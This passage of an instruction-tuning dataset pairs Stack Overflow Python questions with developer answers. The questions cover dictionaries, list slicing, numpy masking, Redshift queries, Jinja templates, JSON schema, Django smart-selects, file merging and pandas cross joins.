    if con_2==0:\n                dict_head_conj_new.setdefault(a_key, []).append(dict_head_conj_pair[a_key][con_2])\n            else:\n                dict_head_conj_new[a_key].append(dict_head_conj_pair[a_key][con_2])\nprint(&quot;dict_head_conj_new: &quot;,dict_head_conj_new)\n<\/code><\/pre>\n<p>Current undesired output:<\/p>\n<pre><code>dict_head_conj_new:  {'aa': ['AA'], 'bb': ['BB', 'MM', 'MM', 'MM'], 'BB': ['MM'], 'cc': ['dd', 'dd', 'dd', 'GG', 'GG', 'GG', 'GG', 'GG', 'HH', 'HH', 'HH', 'HH', 'HH', 'LL', 'LL', 'LL', 'LL', 'LL'], 'dd': ['GG', 'HH', 'LL', 'GG', 'HH', 'LL', 'GG', 'HH', 'LL']}\n\n<\/code><\/pre>\n<p>If anyone can see where am I wrong or provide a hint on how to get my desired result, I much appreciate!<\/p>\n<p>Thanks!<\/p>","output_text":"<p>This works for your data inasmuch as it produces your desired output. Potentially inefficient (because of the need to search for values) for very large dictionaries though but certainly a lot less code than in your original question.<\/p>\n<pre><code>initial_dict = {'aa': ['AA'],'bb':['BB'],'BB':['MM'],'cc':['dd'],'dd':['GG','HH','LL']}\ngoal_dict = dict()\n\ndef find_value(val):\n    for k, v in goal_dict.items():\n        if val in v:\n            return k\n\nfor k, v in initial_dict.items():\n    if (_k := find_value(k)):\n        goal_dict[_k] += v\n    elif not k in goal_dict:\n        goal_dict[k] = v\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n IndexError: list index out of range, but index exists<p>I've written the following code:<\/p>\n<pre><code>def get_sublist(lst, starter, end):\nres = []\nstart = False\ntemp = []\n\nfor item in lst:\n    if item == starter:\n        start = True\n        temp.append(item)\n\n    elif item == end:\n        start = False\n        temp.append(item)\n        res.append(temp)\n        temp = []\n\n    elif start:\n        temp.append(item)\n    else:\n        pass\n\nprint(res)\nprint(res[0])\nreturn list(zip(res[0], res[0][1:]))\n<\/code><\/pre>\n<p>(assume the indentation is correct)<\/p>\n<p>Basically, it slices a list based on a starter and ending element. In my example, these elements are tuples.<\/p>\n<p>The results of the two print statements are:<\/p>\n<pre><code>[[(0.25, 0.5), (0.9, 0.35), (0.9, 0.35), (0.2, 0.5)]]\n[(0.25, 0.5), (0.9, 0.35), (0.9, 0.35), (0.2, 0.5)]\n<\/code><\/pre>\n<p>Yet the traceback specifically points to <code>print(res[0])<\/code> as the indexing error. however, it even prints, and I can visually verify that yes there is a 0th element in the list. So why is it giving such an error?<\/p>\n<p>Edit: based on comment, this is how I am calling function:<\/p>\n<pre><code>o1, o2, d1, d2 = [(0.25, 0.5), (0.9, 0.35), (0.2, 0.5), (0.9, 0.35)]\nlst = [(0.05, 0.3), (0.25, 0.5), (0.9, 0.35), (0.9, 0.35), (0.2, 0.5)]\n\no2d2 = get_sublist(lst, o2, d2)\n<\/code><\/pre>\n<p>Further edit: upon restarting the terminal, I no longer see the two print statements previously mentioned. only see [] printed now.<\/p>","output_text":"<p>You are unnecessarily making things complicated for simple problem - <em>You are not handling some of the cases when both values are equal, when duplicates exist in lst etc.,<\/em>.<\/p>\n<p>Since you need a slice of <code>lst<\/code> between <code>starter<\/code> and <code>end<\/code>, you can do this:<\/p>\n<ul>\n<li>Iterate over the <code>lst<\/code> and see if <code>starter<\/code> exists. If yes, store its index in a variable <code>start_idx<\/code> and <code>break<\/code> from loop. <em>The default values of <code>start_idx<\/code> and <code>end_idx<\/code> are <code>None<\/code><\/em><\/li>\n<li>Now Iterate in reverse way and see if <code>end<\/code> exists. If yes, store that index in <code>end_idx<\/code>.<\/li>\n<li>If <code>start_idx<\/code> and <code>end_idx<\/code> are not <code>None<\/code>, Return the slice of the <code>lst<\/code> - <code>lst[start_idx: end_idx+1]<\/code>. Else return <code>Not Found<\/code>.<\/li>\n<\/ul>\n<pre><code>def get_sublist(lst, starter, end):\n    start_idx, end_idx = None, None\n    for i,v in enumerate(lst):\n        if v == starter:\n            start_idx = i\n            break\n\n    for i in range(len(lst)-1,-1,-1):\n        if lst[i] == end:\n            end_idx = i\n            break\n\n    if start_idx is not None and end_idx is not None:\n        return lst[start_idx:end_idx+1]\n    return &quot;Not Found&quot;\n        \n     \no1, o2, d1, d2 = [(0.25, 0.5), (0.9, 0.35), (0.2, 0.5), (0.9, 0.35)]\nlst = [(0.05, 0.3), (0.25, 0.5), (0.9, 0.35), (0.9, 0.35), (0.2, 0.5)]\n\nprint(get_sublist(lst, o1, d2))\nprint(get_sublist(lst, d2, d1))\nprint(get_sublist(lst, (0.6, 0.3), d2))\n<\/code><\/pre>\n<pre><code>[(0.25, 0.5), (0.9, 0.35), (0.9, 0.35)]\n[(0.9, 0.35), (0.9, 0.35), (0.2, 0.5)]\nNot Found\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Removing p% of smallest numpy array<p>I am using Python 3.7 and numpy 1.18. I have a multi-dimensional numpy array of shape (28, 28, 3) and within this np array, I want to remove the 20% of smallest weights. Removing the 20% of smallest weights means I mask such numbers with 0.<\/p>\n\n<p>20% of (28, 28, 3) = 470.4 = 470 (after rounding-off).<\/p>\n\n<p>So, for this np array, for the 470 smallest numbers, how can I mask them to zero?<\/p>\n\n<p>Thanks!<\/p>","output_text":"<p>For perf. efficiency, we can use <a href=\"https:\/\/docs.scipy.org\/doc\/numpy\/reference\/generated\/numpy.argpartition.html\" rel=\"nofollow noreferrer\"><code>np.argpartition<\/code><\/a> -<\/p>\n\n<pre><code># a is input ndarray\nN = int(np.round(a.size*0.2))\na.flat[np.argpartition(a.flat,kth=N)[:N]] = 0\n<\/code><\/pre>\n\n<p>Sample case step-by-step run -<\/p>\n\n<pre><code>In [91]: np.random.seed(0)\n\nIn [92]: a = np.random.randint(10,100,(4,5))\n\nIn [93]: a\nOut[93]: \narray([[54, 57, 74, 77, 77],\n       [19, 93, 31, 46, 97],\n       [80, 98, 98, 22, 68],\n       [75, 49, 97, 56, 98]])\n\nIn [94]: n = 0.2 # ratio of total to be reset\n\nIn [95]: N = int(np.round(a.size*n)) # 4\n\nIn [96]: a.flat[np.argpartition(a.flat,kth=N)[:N]] = 0\n# change 0 to new value to be set, if not zero\n\nIn [97]: a\nOut[97]: \narray([[54, 57, 74, 77, 77],\n       [ 0, 93,  0,  0, 97],\n       [80, 98, 98,  0, 68],\n       [75, 49, 97, 56, 98]])\n<\/code><\/pre>\n\n<p>Alternatively, we can get the threshold value and then compare and assign into masked one -<\/p>\n\n<pre><code>In [117]: threshold_val = a.flat[np.argpartition(a.flat,kth=N)[N]]\n\nIn [118]: a[a&lt;threshold_val] = 0\n\nIn [119]: a\nOut[119]: \narray([[54, 57, 74, 77, 77],\n       [ 0, 93,  0,  0, 97],\n       [80, 98, 98,  0, 68],\n       [75, 49, 97, 56, 98]])\n<\/code><\/pre>\n\n<p>Or use <a href=\"https:\/\/docs.scipy.org\/doc\/numpy\/reference\/generated\/numpy.percentile.html\" rel=\"nofollow noreferrer\"><code>np.percentile<\/code><\/a> -<\/p>\n\n<pre><code>In [148]: a[a&lt;np.percentile(a,20)] = 0\n\nIn [149]: a\nOut[149]: \narray([[54, 57, 74, 77, 77],\n       [ 0, 93,  0,  0, 97],\n       [80, 98, 98,  0, 68],\n       [75, 49, 97, 56, 98]])\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Get max date from columns in Redshift using a dynamically changing list of columns and tables with Python?<p>I am have a list of timestamp columns that correspond to specific tables in Redshift. I want to be able to grab the most recent date of all the timestamp columns for a given table. I can't just write the column names out because the tables have different column names. I have a dataframe with the table name and columns that I need<\/p>\n<pre><code>table_name      column              data_type\n  tbl1       sent_at          timestamp without timezone\n  tbl1       message_received timestamp without timezone\n  tbl1       scene_updated    timestamp without timezone\n  tbl2       phone_updated    timestamp without timezone\n  tbl2       col2_updated     timestamp without timezone\n  tbl3       sent_at          timestamp without timezone\n  tbl3       number_updated   timestamp without timezone\n<\/code><\/pre>\n<p>I want to check from each table, the most recent date of all the timestamp columns. I am trying to create a query that involves creating a string that uses 'max()' and then populates inside the parenthesis to use within the query. Like so:<\/p>\n<pre><code>for table in set(df.table_name):\n   sub = df[df.table_name == table]\n   cols = [x for x in sub.column.values.tolist()]\n   str_max = 'max()' * len(cols)\n   que = 'select' + str_max + 'from {}'.format(table)\n   time_table = pd.read_sql_query(que, conn) \n   .... \n   \n<\/code><\/pre>\n<p>Then, I would used pandas to get the max value of all the columns. However, I can't figure out how to insert the column name in between the '()' to get the max value when all the column names change. Maybe there is a way within Redshift to look at the max of all column values while using a data_type filter but I don't know how to do that.<\/p>","output_text":"<p>I solved this by using another for loop and appending the column names to a string. Then, I joined the list into a single string so I could put it into a single query. After the query ran, I used max() to find the max value of all columns.<\/p>\n<pre><code>for table in set(df.table_name):\n    sub = created_at_tables[created_at_tables.table_name ==  table]\n    cols = [x for x in sub.column_name.values.tolist() if x != 'table_updated_at']\n    col_str = []\n    for i in cols: \n       col_str.append('max(' + i + ') as ' + i)\n    col_str = ','.join(col_str)\n    que = 'select {} from schema.{}'.format(col_str, table)\n    new_table = pd.read_sql_query(que, rsm.dbengine)\n    new_table.dropna(axis = 1, inplace = True)\n    most_recent_date = new_table.max(axis=1).reset_index()[0][0]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n trying to create html table using jinja template and is not working<p>I am trying to create a html table using jinj2 template in python. when i render template i only get headers and not rows. can you please correct my code, thank you.\nbelow is my python code :<\/p>\n<pre><code>Result1 = connection.execute(query)\nResultset = Result1.fetchall()\ntext1 = Template('Hi! $name this is test email.')\nfor row in Resultset:\n    x_row = row\n    print(x_row)\n    user_id = row[0]\n    metric_count = row[1]\n    query_count = row[2]\n    total_usage = row[3]\n    print(user_id)\n    \n\n    # Create the plain-text and HTML version of your message\n\n   # text = &quot;&quot;&quot;text1.substitute(name=row[0])&quot;&quot;&quot;\n\n    with open(&quot;main.html&quot;, 'r') as html_file:\n        html = html_file.read()\n        template = Template(html)\n        html_template = template.render(user_id=user_id,\n                                        metric_count=metric_count,\n                                        query_count=query_count,\n                                        total_usage=total_usage,\n                                        row=x_row)\n\n<\/code><\/pre>\n<pre><code>And my html code:\n&lt;table&gt;\n\n        &lt;tr&gt;\n            &lt;th&gt;User Name&lt;\/th&gt;\n            &lt;th&gt;Metric Count&lt;\/th&gt;\n            &lt;th&gt;Queries Count&lt;\/th&gt;\n            &lt;th&gt; Total Memory Usage&lt;\/th&gt;\n        &lt;\/tr&gt;\n        &lt;tbody&gt;\n        {% for item in row %}\n        &lt;tr&gt;\n            &lt;td&gt;{{ item.user_id }}&lt;\/td&gt;\n            &lt;td&gt;{{ item.metric_count }}&lt;\/td&gt;\n            &lt;td&gt;{{ item.query_count }}&lt;\/td&gt;\n            &lt;td&gt;{{ item.total_usage }}&lt;\/td&gt;\n        &lt;\/tr&gt;\n        {% endfor %}\n        &lt;\/tbody&gt;\n    &lt;\/table&gt;\n<\/code><\/pre>\n<p>I have used <a href=\"https:\/\/stackoverflow.com\/questions\/9198334\/how-to-build-up-a-html-table-with-a-simple-for-loop-in-jinja2\">How to build up a HTML table with a simple for loop in Jinja2?<\/a> as reference.<\/p>","output_text":"<p>In your case you need to store the x_row as a dict in python and you don't need to pass other parameters like 'user_id', 'metric_count', etc.<\/p>\n<p>Here's how you can rectify your python code:<\/p>\n<pre><code>Result1 = connection.execute(query)\nResultset = Result1.fetchall()\ntext1 = Template('Hi! $name this is test email.')\nx_rows = []\nfor row in Resultset:\n    print(x_row)\n    x_row.append({\n    'user_id': row[0],\n    'metric_count': row[1],\n    'query_count': row[2],\n    'total_usage': row[3]\n    })\n    print(user_id)\n\n    with open(&quot;main.html&quot;, 'r') as html_file:\n        html = html_file.read()\n        template = Template(html)\n        html_template = template.render(row=x_rows)\n<\/code><\/pre>\n<p>This way your jinja2 renderer will pick value from list of dict.\nCheers!!<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Inconsistent execution time<p>I am timing a function I created and getting inconsistent results.  Since I'm using time.time(), I am used to having some small variability in times reported, but my timing data seems bimodal, which I don't understand.<\/p>\n\n<p>My function:<\/p>\n\n<pre><code>def sorteddups(listA,listB,key=None, equal=lambda x,y:x==y,greater=lambda x,y:x&gt;y,mode=3):#mode: 0=AB, 1=Aonly, 2=Bonly, 3=[Aonly,Bonly,AB]\nA=sorted(listA,key=key)\nB=sorted(listB,key=key)\nAB=[]\ndupA=set()\ndupB=set()\nj=0\nfor i,a in enumerate(A):\n    try:\n        while greater(a,B[j]):j+=1\n        if equal(a,B[j]):\n            AB.append([a,B[j]])\n            dupA.add(i)\n            dupB.add(j)\n    except:pass\nif mode==1 or mode==3:Aonly=[a for i,a in enumerate(A) if i not in dupA]\nif mode==2 or mode==3:Bonly=[b for i,b in enumerate(B) if i not in dupB]\nreturn AB if mode==0 else Aonly if mode==1 else Bonly if mode==2 else [Aonly,Bonly,AB]\n<\/code><\/pre>\n\n<p>My results:<\/p>\n\n<pre><code>&gt;&gt;&gt; t=time()\n&gt;&gt;&gt; test3=sorteddups(test,test2)\n&gt;&gt;&gt; time()-t\n0.836998701095581\n&gt;&gt;&gt; t=time()\n&gt;&gt;&gt; test3=sorteddups(test,test2)\n&gt;&gt;&gt; time()-t\n1.2330021858215332\n&gt;&gt;&gt; t=time()\n&gt;&gt;&gt; test3=sorteddups(test,test2)\n&gt;&gt;&gt; time()-t\n1.2690012454986572\n&gt;&gt;&gt; t=time()\n&gt;&gt;&gt; test3=sorteddups(test,test2)\n&gt;&gt;&gt; time()-t\n0.8360021114349365\n&gt;&gt;&gt; t=time()\n&gt;&gt;&gt; test3=sorteddups(test,test2)\n&gt;&gt;&gt; time()-t\n1.2589986324310303\n&gt;&gt;&gt; t=time()\n&gt;&gt;&gt; test3=sorteddups(test,test2)\n&gt;&gt;&gt; time()-t\n0.8310055732727051\n&gt;&gt;&gt; t=time()\n&gt;&gt;&gt; test3=sorteddups(test,test2)\n&gt;&gt;&gt; time()-t\n1.2420125007629395\n<\/code><\/pre>\n\n<p>Any idea what would cause this bimodal distribution of execution time?<\/p>\n\n<p>Edit: Here's some test code you can run:<\/p>\n\n<pre><code>import random\nimport string\nfrom time import time\ntest=[[''.join(random.choice(string.ascii_lowercase) for i in range(150)),[random.randint(1,1000) for _ in range(4)],random.random()] for _ in range(200000)]\ntest2=test\nfor _ in range(10):\n    t=time()\n    test3=sorteddups(test,test2)\n    print(time()-t)\n<\/code><\/pre>\n\n<p>Edit:\nI tested this on my machine and my coworkers machine yesterday.  Both produces clearly bimodal results.  Today results are normal for both of us.  My only guess is that there was a system-wide update, but my computer was not restarted.  If anyone has a theory, I'm interested to hear what could cause this on separate machines and then stop the next day on both without a restart.  Marking question as answered.<\/p>","output_text":"<p>I ran the test and got more consistent results. I would assume that it related to resources of the machine that it runs on.<\/p>\n\n<p>Result:<\/p>\n\n<pre><code>1.9347724914550781\n1.9128038883209229\n1.9010097980499268\n1.948140277862549\n1.9257290363311768\n1.9285156726837158\n1.9264476299285889\n1.9322516918182373\n1.9303538799285889\n1.931032419204712\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to define nested arrays in JSON schema where the base type of array items is specific type<p>I am using <a href=\"https:\/\/python-jsonschema.readthedocs.io\/en\/stable\/\" rel=\"nofollow noreferrer\">python's jsonschema<\/a> to validate YAML files. One of the things I can't figure out how to do is allow nested arrays but enforce the base type of all array items are strings. I need this capability to handle YAML anchors. For example, how would I construct the schema to ensure that <code>a<\/code>, <code>b<\/code>, <code>c<\/code>,... are all strings? For reference, I don't know how nested this array will be so I don't think using simple <code>anyOf<\/code> would work.<\/p>\n<pre><code>[&quot;a&quot;, [&quot;b&quot;, [&quot;c&quot;]], ...]\n<\/code><\/pre>\n<p>I referenced the docs about <a href=\"https:\/\/json-schema.org\/understanding-json-schema\/structuring.html#recursion\" rel=\"nofollow noreferrer\">recursion<\/a> and this seems like what I need, I just don't understand it well enough to implement it for this case.<\/p>\n<p>Ideally, I would like all base items of the array to be unique, but this might be asking too much as I can easily accomplish checking that in python after flattening the array.<\/p>","output_text":"<p>For a single level array of strings:<\/p>\n<pre><code>{\n  &quot;type&quot;: &quot;array&quot;,\n  &quot;items&quot;: {\n    &quot;type&quot;: &quot;string&quot;\n  },\n  &quot;uniqueItems&quot;: true\n}\n<\/code><\/pre>\n<p>You can make the <code>items<\/code> schema recursive by allowing it to be an array of arrays, or strings:<\/p>\n<pre><code>{\n  &quot;$defs&quot;: {\n    &quot;nested_array&quot;: {\n      &quot;type&quot;: &quot;array&quot;,\n      &quot;items&quot;: {\n        &quot;anyOf&quot;: [\n          { &quot;type&quot;: &quot;string&quot; },\n          { &quot;$ref&quot;: &quot;#\/$defs\/nested_array&quot; }\n        ]\n      },\n      &quot;uniqueItems&quot;: true\n    }\n  },\n  &quot;$ref&quot;: &quot;#\/$defs\/nested_array&quot;\n}\n<\/code><\/pre>\n<p>reference: <a href=\"https:\/\/json-schema.org\/understanding-json-schema\/reference\/array.html\" rel=\"nofollow noreferrer\">https:\/\/json-schema.org\/understanding-json-schema\/reference\/array.html<\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to use smart-selects in Django admin panel?<p>I am trying to do smart-selects in Django admin panel using <a href=\"https:\/\/django-smart-selects.readthedocs.io\/en\/latest\/index.html\" rel=\"nofollow noreferrer\">django-smart-selects<\/a>. I want to make sure that when creating a term, you first need to select an subject, and based on this item, select a section related to this subject.\nI did <code>pip install django-smart-selects<\/code> and added <code>smart_selects<\/code> to <code>INSTALLED_APPS<\/code>.<\/p>\n<p>Here is my code.<\/p>\n<p>models.py<\/p>\n<pre><code>from smart_selects.db_fields import ChainedForeignKey\n\nclass Subject(models.Model):\n    name = models.CharField(max_length=128)\n\nclass Section(models.Model):\n    subject = models.ForeignKey(Subject, on_delete=models.CASCADE)\n    name = models.CharField(max_length=128)\n    position = models.IntegerField()\n\nclass Term(models.Model):\n    subject = models.ForeignKey(Subject, on_delete=models.CASCADE)\n    section = ChainedForeignKey(Section, chained_field='subject', chained_model_field='subject', show_all=False)\n    name = models.CharField(max_length=128)\n    definition = models.TextField()\n<\/code><\/pre>\n<p>urls.py<\/p>\n<pre><code>urlpatterns = [\n    path('admin\/', admin.site.urls),\n    path('', include('subjects.urls')),\n    path('', include('main.urls')),\n] + static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)\n<\/code><\/pre>\n<p>When I create a new term and choose a subject, I can select any section, not just related to this subject. I think I need to add <code>include('smart_selects.urls')<\/code> to the admin path.<\/p>\n<p>I tried to do this, but it didn't change anything:<\/p>\n<pre><code>path('admin\/', admin.site.urls),\npath('admin\/', include('smart_selects.urls')),\n<\/code><\/pre>\n<p>Also I tried to do this, but it gives the &quot;TypeError 'tuple' object is not a mapping&quot;:<\/p>\n<pre><code>path('admin\/', admin.site.urls, include('smart_selects.urls')),\n<\/code><\/pre>","output_text":"<p>The problem was that in <code>admin.py<\/code> in the <code>TermAdmin<\/code> class, I wrote <code>autocomplete_fields = ['section']<\/code>. After removing this line, everything works.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How do I get an output of lines that comes as a result merging lines in 2 files line by line, then save the output in a third file? (Python 3)<p>I have to take lines from 2 files, put them side by side and write them into a new text file.<\/p>\n<p>File 1 &quot;pythonStatements.txt&quot;:<\/p>\n<pre><code>    enter code hereprint(&quot;Hello World&quot;)       # print statement\n\n   x = x + 1      #Assignment statement \n\n  for i in range(1,n):    #for loop with range  \n\n         calculateSum(a,b)   #function call\n<\/code><\/pre>\n<p>File 2 &quot;machineCode.txt&quot;:<\/p>\n<pre><code>0000000000010100\n\n1100110011001100\n\n1010101010101010\n\n1001001001001000\n<\/code><\/pre>\n<p>Write code that combines the 2 files line by line and the output should be in a new file.<\/p>\n<p>My code:<\/p>\n<pre><code>mct = open(&quot;machineCode.txt&quot;, &quot;r&quot;)\npst = open(&quot;pythonStatements.txt&quot;, &quot;r&quot;)\n\nfor linex in pst:\n    linex=linex.lstrip()\n    linex=linex.rstrip()\n    for liney in mct:\n        x=open(&quot;NewFile&quot;,&quot;w&quot;)\n        x.write(&quot;%s %s \\n&quot;%(linex,liney))\n<\/code><\/pre>\n<p>I am able to put the first lines of the 2 files side by side, and save the output in a third file, but the other lines are not showing for some reason. Can someone explain what I am doing wrong and what i can do to fix it?<\/p>\n<p>Output in the third file should look like this:<\/p>\n<pre><code>print(&quot;Hello World&quot;)       # print statement 1001001001001000 \n\nx = x + 1      #Assignment statement 1001001001001000 \n\nfor i in range(1,n):    #for loop with range 1001001001001000 \n\ncalculateSum(a,b)   #function call 1001001001001000\n<\/code><\/pre>\n<p>NEW CODE:<\/p>\n<pre><code>mct = open(&quot;machineCode.txt&quot;, &quot;r&quot;)\npst = open(&quot;pythonStatements.txt&quot;, &quot;r&quot;)\nx=open(&quot;output.txt&quot;,&quot;w&quot;)\n\u200b\nfor linex in pst:\n    for liney in mct:\n        print(&quot;&quot;)\n    x.write(&quot;%s %s \\n&quot;%(linex.lstrip().rstrip(),liney))\n\u200b\nmct.close()\npst.close()\nx.close()\n<\/code><\/pre>\n<p>Ouput of the NEW CODE:<\/p>\n<pre><code>print(&quot;Hello World&quot;)       # print statement 1001001001001000 \nx = x + 1      #Assignment statement 1001001001001000 \nfor i in range(1,n):    #for loop with range 1001001001001000 \ncalculateSum(a,b)   #function call 1001001001001000 \n<\/code><\/pre>\n<p>DESIRED OUTPUT:<\/p>\n<pre><code>print(&quot;Hello World&quot;)     0000000000010100\nx = x + 1    1100110011001100\nfor i in range(1,n):     1010101010101010\ncalculateSum(a,b)    1001001001001000\n<\/code><\/pre>","output_text":"<p>The problem was that you open file for rewriting every iteration in the loop.<\/p>\n<pre><code>with open(&quot;machineCode.txt&quot;) as mct:\n    with open(&quot;pythonStatements.txt&quot;) as pst:\n        with open(&quot;NewFile&quot;, &quot;w&quot;) as new:\n            for line_x, line_y in zip(mct, pst):\n                new.write(line_x.strip() + line_y)\n<\/code><\/pre>\n<hr \/>\n<pre><code>mct = open(&quot;machineCode.txt&quot;)\npst = open(&quot;pythonStatements.txt&quot;)\nnew = open(&quot;NewFile&quot;, &quot;w&quot;)\n\nwhile True:\n    try:\n        new.write(next(mct).strip() + next(pst))\n    except StopIteration:\n        break\n        \nmct.close()\npst.close()\nnew.close()\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Parsing a list with hyphens including and extra hyphen at the end<p>I have a function that takes elements in a list and adds a hyphen between them and it works fine, the issue is when I want to add <code>[&quot; &quot;, &quot; &quot;, &quot; &quot;]<\/code> as a list it outputs <code>------<\/code> but it should have outputted <code>- - -<\/code> because there are 3 elements in the list. I can't figure out how to fix this. Any help is appreciated. Thanks in advance.<\/p>\n<pre><code>def printList(myList):\n\n    str1 = ' '.join(map(str,myList))\n    \n    for i in range(0, len(str1), 1):\n        if (str1[i] == ' '):\n            str1 = str1.replace(str1[i], '-')\n    print(str1 + &quot;-&quot;)\nprintList([&quot; &quot;, &quot; &quot;, &quot; &quot;])\n<\/code><\/pre>","output_text":"<p>You should use <code>join()<\/code> as this is exactly what it is designed for.<\/p>\n<pre><code>'-'.join([&quot; &quot;, &quot; &quot;, &quot; &quot;])\n#' - - '\n<\/code><\/pre>\n<p>If you also want to add <code>-<\/code> to the end, just add it to the output <code>string<\/code><\/p>\n<pre><code>'-'.join([&quot; &quot;, &quot; &quot;, &quot; &quot;]) + '- '\n#' - - - '\n<\/code><\/pre>\n<p>For integer based lists, <code>map<\/code> your elements to <code>str()<\/code><\/p>\n<pre><code>'-'.join(map(str, [1, 2, 3, 4, 5]))\n#'1-2-3-4-5'\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n nested Iteration over two large data frame in python<p>Assuming I have the following data frames:<\/p>\n<pre><code># data frame circles\n    ID   x   y\n    1    4   5\n    2    5   6\n# data frame points\n    ID   x   y\n    1    2   1\n    2    1   2\n<\/code><\/pre>\n<p>I'm going to check if every point is located inside every circle or not\nAnd if the point located inside (based on some calculation), take the circle's ID and keep it in a separate list<\/p>\n<pre><code># output of the list (ID of the circles)\n[1]\n[1 2]\n<\/code><\/pre>\n<p>This means <code>point 1<\/code> is inside circle 1 and <code>point 2<\/code> is located in both circles.<\/p>\n<p>Now, I wrote the following function to do that locating work.<\/p>\n<pre><code>        for i in range(len(points)):\n            for j in range(len(circles)):\n                get_point_coordinates = (points.loc[i].at[&quot;x&quot;], points.loc[i].at[&quot;y&quot;])\n                get_circle_coordinates = (circles.loc[j].at[&quot;x&quot;], circles.loc[j].at[&quot;y&quot;])\n                 ### calling library's function to calculate\n                distance = distance.great_circle(get_point_coordinates, get_circle_coordinates ).km\n                if distance &lt;= 5:\n                    list[i].append(circles.loc[j].at[&quot;ID&quot;])\n<\/code><\/pre>\n<p>It's a nested loop to iterate every single point and check all the circles one by one.<\/p>\n<p><strong>THE PROBLEM IS:<\/strong> the original data frame is over 100,000 rows, so it takes forever to iterate.<\/p>\n<p>I read some posts about using <code>apply<\/code> to deal with massive data.\nso, I tried the following but it didn't work (error: The truth value of a Series is ambiguous).<\/p>\n<pre><code>    for i in range(len(circles)):\n        newlist = newDataFrame['result'].apply(get_distance_function(circles.loc[i].at[&quot;x&quot;], circles.loc[i].at[&quot;y&quot;], points['x'], points['y']))\n<\/code><\/pre>\n<p>Yet I think it would still be a problem because I got rid of the inner for loop only, I still have to iterate 100,000 times instead of 100,000 * 100,000<\/p>\n<p>So, any better ideas? or this approach is the shortest and I should fix the error?<\/p>","output_text":"<pre><code>import pandas as pd\npoints = pd.DataFrame({&quot;ID&quot;: [1, 2], &quot;x&quot;: [4, 5], &quot;y&quot;: [5, 6]})\ncircle = pd.DataFrame({&quot;ID&quot;: [1, 2], &quot;x&quot;: [2, 1], &quot;y&quot;: [1, 2]})\n<\/code><\/pre>\n<p>To get all the combinations of the (point, circle), we can do a cross join.<\/p>\n<pre><code>new_df = points.merge(circle, how='cross', suffixes=[&quot;_point&quot;, &quot;_circle&quot;])\nnew_df\n\n    ID_point   x_point  y_point ID_circle   x_circle    y_circle\n0          1         4        5         1          2           1\n1          1         4        5         2          1           2\n2          2         5        6         1          2           1\n3          2         5        6         2          1           2\n\n<\/code><\/pre>\n<p>With that, we can compare a point with a circle at each row level. We use <code>apply<\/code> at the row level (<code>axis=1<\/code>). Distance is calculated and added as a new column.<\/p>\n<pre><code>import math\n\n# this is a Euclidean distance function (feel free to change it to suit your need)\ndef get_distance_function(x1, y1, x2, y2):\n    return math.sqrt((x1-x2)**2 + (y1-y2)**2)\n\n\nnew_df[&quot;distance&quot;] = new_df.apply(lambda row: get_distance_function(row[&quot;x_point&quot;], row[&quot;y_point&quot;], row[&quot;x_circle&quot;], row[&quot;y_circle&quot;]), axis=1)\nnew_df\n\n    ID_point    x_point y_point ID_circle   x_circle    y_circle    distance\n0          1          4       5         1          2           1    4.472136\n1          1          4       5         2          1           2    4.242641\n2          2          5       6         1          2           1    5.830952\n3          2          5       6         2          1           2    5.656854\n<\/code><\/pre>\n<p>With the distance, we can check if it is within the radius (set as 5 in this example) and group the <code>ID_point<\/code> by <code>ID_circle<\/code> and make it a list.<\/p>\n<pre><code>radius = 5\nnew_df[new_df[&quot;distance&quot;]&lt;=radius].groupby(&quot;ID_circle&quot;)[&quot;ID_point&quot;].apply(list).reset_index()\n\n   ID_circle    ID_point \n0          1         [1]\n1          2         [1]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to loop through json dictionary inside of list<p>I am doing web scraping, and I got data in a json object that looks like this:<\/p>\n\n<pre><code>{'categories': '[{\"title\":\"Name\", \"desc\":\"Mike\"}, {\"title\":\"Food\", \"desc\":\"Muffin\"}]'}\n<\/code><\/pre>\n\n<p>And I want to loop through this dictionary and just get one value \"Muffin\".\nMy code is:<\/p>\n\n<pre><code>for item in the_dict:\n    for i in range(0, len(item)-1):\n        muff_filter = json.loads(the_dict['categories'])[i]['title']    \n        if muff_filter == 'Food':\n            print(json.loads(the_dict['categories'])[i]['desc'])\n        else:\n            pass  \n<\/code><\/pre>\n\n<p>I get expected output, however I keep getting the error:<\/p>\n\n<pre><code>Muffin\n---------------------------------------------------------------------------------\nIndexError                                Traceback (most recent call last)\n&lt;ipython-input-50-9a650257d42a&gt; in &lt;module&gt;\n     61     for item in the_dict:\n     62         for i in range(0, len(item)-1):\n---&gt; 63             food_filter = json.loads(the_dict['categories'])[i]['title']\n     64             if food_filter == 'Food':\n     65                 print(json.loads(the_dict['categories'])[i]['desc'])\n\nIndexError: list index out of range\n<\/code><\/pre>\n\n<p>I tried enumerating the list but still get the same error, and also tried using a key, value pair but the same error. Can you give me an idea where I'm thinking wrong?<\/p>\n\n<p>+++ So I have run %xmode Verbose according to the suggestion in the comment,\nand I got the following 